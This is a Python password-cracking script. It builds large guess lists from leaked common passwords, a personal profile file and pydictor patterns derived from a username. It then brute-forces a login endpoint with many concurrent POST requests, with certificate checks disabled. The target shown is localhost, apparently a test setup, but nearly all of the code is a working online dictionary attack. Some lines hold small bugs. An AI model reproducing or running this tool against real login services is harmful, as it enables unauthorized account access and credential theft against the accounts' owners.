import requests
from timeit import default_timer as timer
import os
import threading
import sys 
session = requests.Session()
passwordCrackCombinations = {
    "number" : [],
    "birthday" : [],
    "lowernum" : [],
    "uppernum" : [],
    "complex" : [],
    "common" : [],
    "cupp" : [],
}
fileNames = []

commonPasswordsFile1 = open('10million_passwords_part1.txt')
commonPasswordsList1 = []
for line in commonPasswordsFile1:
    commonPasswordsList1.append(line.replace('\n', ''))
commonPasswordsFile2 = open('10million_passwords_part2.txt')
commonPasswordsList2 = []
for line in commonPasswordsFile2:
    commonPasswordsList2.append(line.replace('\n', ''))
    
cuppPasswordsFile = open('MISC\Common User Passwords Profiler\mihai.txt')
cuppPasswordsList = []
for line in cuppPasswordsFile:
      newLine = line.replace('\n', '')
      if len(line) <= 1 :
          continue
      cuppPasswordsList.append(newLine)

combinedPasswords = list(set(commonPasswordsList1 + commonPasswordsList2))
# Yield successive n-sized 
# chunks from l. 
def divide_chunks(l, n): 
      
    # looping till length l 
    for i in range(0, len(l), n):  
        yield l[i:i + n] 
def generateAllNumbersPasswords():
    for i in range(5,13):
        fileName = f"digital_pass{i}.txt"
        stringParams = "{" + f"{i},{i}" + "}"
        confParams = "[0-9]"
        compParams = ""
        if i <= 7:
            compParams = "<=9"
        else:
            compParamas = "==9"
        repeatParams = ""
        if i <= 9:
            repeatParams = "==1"
        else:
            repeatParams = "<=2"
        print(stringParams)
        os.system('python MISC\pydictor\pydictor.py --conf "{}{}<none>" -o D:\{} --types "==0" "{}" "==0" --repeat "==0" "{}" "==0"'.format(confParams,stringParams,compParams,repeatParams, fileName))
        f = open(f"D:\{fileName}")
  
        lines = []
        for line in f :
            lines.append(line.replace('\n', ''))
            if len(lines) == 50000000:
                break
        for batch in divide_chunks(lines, 100000):
            passwordCrackCombinations["number"].append(batch)    
        fileNames.append(fileName)

def getBirth(dateString):
    return dateString[len(dateString)-2:] + dateString[len(dateString)-4:len(dateString)-2] + dateString[:4]
def generateAllBirthdayPasswords():
    i = 8
    fileName = f"birthday_pass{i}.txt"
    startDate = "20130101"
    endDate = "20240101"
    os.system(f'python MISC\pydictor\pydictor.py -plug birthday "{startDate}" "{endDate}" --len {i} {i}')
    f = open(f"D:\{fileName}")

    lines = []
    for line in f :
        lines.append(line.replace('\n', ''))
        birthDate = getBirth(line.replace('\n'), '')
        lines.append(birthDate)
        if len(lines) == 50000000:
            break
    for batch in divide_chunks(lines, 1000):
        passwordCrackCombinations["birthday"].append(batch)    
    fileNames.append(fileName)
        
def generateCombinedLowercaseLettersNumbersPasswords(user):
    userSplit = "[" + ",".join([*user]) + "]"
    for i in range(8,13):
        fileName = f"lowernum{i}.txt"
        stringParams = "{" + f"{i-4},{i-4}" + "}"
        countParams = "{4,4}"
        os.system('python MISC\pydictor\pydictor.py --conf "{}{}<none>[0-4]{}<none>" -o D:\{} --types "<=4" "<=5" "==0" --repeat "==1" "<=1" "==0"'.format(userSplit,countParams,stringParams,fileName))
        f = open(f"D:\{fileName}")
        lines = []
        for line in f :
            lines.append(line.replace('\n', ''))
            if len(lines) == 50000000:
                break
        for batch in divide_chunks(lines, 5000):
            passwordCrackCombinations["lowernum"].append(batch) 
        fileNames.append(fileName)

def generateCombinedUppercaseLettersNumbersPasswords(user):
    userSplit = "[" + ",".join([*(user.upper())]) + "]"
    for i in range(8,13):
        fileName = f"uppernum{i}.txt"
        stringParams = "{" + f"{i-4},{i-4}" + "}"
        countParams = "{4,4}"
        os.system('python MISC\pydictor\pydictor.py --conf "{}{}<none>[0-4]{}<none>" -o D:\{} --types "<=4" "<=5" "==0" --repeat "<=1" "<=1" "==0"'.format(userSplit,countParams,stringParams,fileName))
        f = open(f"D:\{fileName}")
        lines = []
        for line in f :
            lines.append(line.replace('\n', ''))
            newLine = line.replace('\n', '')
            newElem = newLine[len(newLine)-(i-4):] + newLine[:4]
            lines.append(newElem)
            if len(lines) == 50000000:
                break
        for batch in divide_chunks(lines, 10000):
            passwordCrackCombinations["uppernum"].append(batch) 
        fileNames.append(fileName)

def generateComplexPasswords(user):
    user1 = user.capitalize()
    user2 = user1[::-1]
    user2 = user2[0].upper() + user2[1:] + user2[0]
    userSplit = "[" + ",".join([*user2]) + "]"
    for i in range(8,13):
        fileName = f"complex{i}.txt"
        stringParams = "{" + f"{i-4},{i-4}" + "}"
        countParams = "{4,4}"
        os.system('python MISC\pydictor\pydictor.py --conf "{}{}<none>[0-4]{}<none>" -o D:\{} --types "<=5" "<=5" "==0" --repeat "<=1" "<=1" "==0"'.format(userSplit,countParams,stringParams,fileName))
        f = open(f"D:\{fileName}")
        lines = []
        for line in f :
            lines.append(line.replace('\n', ''))
            newLine = line.replace('\n', '')
            newElem = newLine[len(newLine)-(i-4):] + newLine[:4]
            lines.append(newElem)
            if len(lines) == 50000000:
                break
        for batch in divide_chunks(lines, 10000):
            passwordCrackCombinations["complex"].append(batch) 
        fileNames.append(fileName)
def generateFromCommonPasswords():
    for batch in divide_chunks(combinedPasswords, 10000):
        passwordCrackCombinations["common"].append(batch)
def generateFromCupp():
    for batch in divide_chunks(cuppPasswordsList, 2500):
        passwordCrackCombinations["cupp"].append(batch)         

def generateDictCombinations(user):
    generateAllNumbersPasswords()
    generateAllBirthdayPasswords()
    generateCombinedLowercaseLettersNumbersPasswords(user)
    generateCombinedUppercaseLettersNumbersPasswords(user)
    generateComplexPasswords(user)
    generateFromCommonPasswords()
    generateFromCupp()

def parallel_dict_brute_force(value, attempts):
    for password in value:
        url = "https://localhost:9443/login"
        body = {'username':'test', 'password': password}
        print(f"checking {password}")
        resp = session.post(url, json=body, verify=False)
        attempts = attempts + 1
        if resp.status_code == 200:
             print(f"Password cracked in {attempts} attempts. The password is {password}.")
             end = timer()
             print(f"Time elapsed {end - start}")
             for fileName in fileNames:
                 os.remove(f"D:\{fileName}")
             os._exit(1)
    return (attempts, None)

def parallel_dict_brute_force_list(value, attempts):
    listInnerThreads = [None] * len(value)
    for i in range(0, len(value)):
        listInnerThreads[i] = threading.Thread(target=parallel_dict_brute_force,args=(value[i], attempts))
        listInnerThreads[i].start()
    for i in range(0, len(value)):
        listInnerThreads[i].join()

def doRequests(passDictionary, listThreads, attempts):
    idx = 0
    for key, value in passDictionary.items():
        if len(value) == 0:
            continue
        listThreads[idx] = threading.Thread(target=parallel_dict_brute_force_list,args=(value, attempts))
        listThreads[idx].start()
        idx = idx + 1
    for i in range(0, len(listThreads)):
        listThreads[i].join()

generateDictCombinations(sys.argv[1])

listThreads = [None] * 1
attempts = 0
start = timer()
doRequests(passwordCrackCombinations, listThreads, attempts)